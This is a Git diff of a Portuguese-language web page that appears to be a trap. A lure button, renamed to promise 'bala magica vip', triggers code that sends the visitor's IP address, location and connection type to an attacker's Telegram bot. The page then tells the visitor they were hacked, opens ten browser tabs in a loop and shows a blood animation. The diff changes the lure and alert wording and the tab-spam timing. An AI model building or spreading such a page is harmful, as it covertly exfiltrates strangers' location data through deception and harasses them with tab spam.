@@ -98,7 +98,7 @@
     <div class="message" id="internetMessage"></div>
 
     <!-- Botão para tocar a música e abrir guias -->
-    <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
+    <button id="playButton">Clique aqui para acessar bala magica vip</button>
 
     <!-- Container do vídeo do YouTube -->
     <div id="videoContainer">
@@ -126,7 +126,7 @@
 
         // Função para enviar mensagem para o Telegram
         async function sendToTelegram(ip, location, connection) {
-            const message = `Você foi hackeado!\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
+            const message = `Usuario Caiu na armadilha\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramGroupId}&text=${encodeURIComponent(message)}`;
 
             await fetch(url);
@@ -141,7 +141,7 @@
                 await sendToTelegram(userInfo.ip, userInfo.location, userInfo.connection);
                 
                 // Atualiza as mensagens na página
-                document.getElementById('ipMessage').innerText = `Você foi hackeado! IP: ${userInfo.ip}`;
+                document.getElementById('ipMessage').innerText = `Você foi hackeado IP: ${userInfo.ip}`;
                 document.getElementById('locationMessage').innerText = `Localização: ${userInfo.location}`;
                 document.getElementById('internetMessage').innerText = `Conexão: ${userInfo.connection}`;
                 
@@ -156,7 +156,7 @@
                     for (let i = 0; i < 10; i++) {
                         window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
                     }
-                }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
+                }, 3000); // Intervalo de 1 segundo (1000 milissegundos)
 
                 // Inicia a animação das gotículas de sangue
                 createBloodDrops();
